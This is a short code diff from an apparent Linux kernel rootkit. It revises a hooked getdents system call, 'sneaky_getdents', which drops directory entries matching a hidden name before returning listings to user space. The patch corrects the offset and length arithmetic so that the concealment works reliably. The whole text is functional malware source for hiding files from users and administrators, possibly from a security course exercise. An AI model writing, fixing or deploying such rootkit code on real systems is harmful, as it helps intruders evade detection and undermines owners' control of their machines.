@@ -104,29 +104,30 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   set_fs(userspace);
 
   //iterate through numbytes
-  long i, j, found_block;
+  long i, found_block;
+  found_block = 0;
   unsigned long result;
-  for (i = j = 0; i < numbytes; i+= dir->d_reclen) {
+  for (i = 0; i < numbytes; i+= dir->d_reclen) {
     dir = (struct linux_dirent *) (mem + i);
     
     //Dirent name matches our executable name --> DO NOT COPY TO USER SPACE
     if(strncmp(dir->d_name, SNEAKY, SNEAKYSIZE) == 0) {
-      found_block = dir->d_reclen;
+      found_block += dir->d_reclen;
       continue;
     }
     //copy kernel memory to dirent in user space casted as char* 
-    if (result = copy_to_user(mychar + j, dir,dir->d_reclen)!= 0) {
+    if (result = copy_to_user(mychar + (i-found_block), dir,dir->d_reclen)!= 0) {
       //if failure: free our buffer
       kfree(mem);
       //exit
       return -EAGAIN;
     }
-    j += dir->d_reclen;
+
   }
   
-  //changes numbytes to j
+  //changes numbytes 
   if (numbytes > 0) {
-    numbytes = j;
+    numbytes = (i - found_block);
   }
   
   kfree(mem);
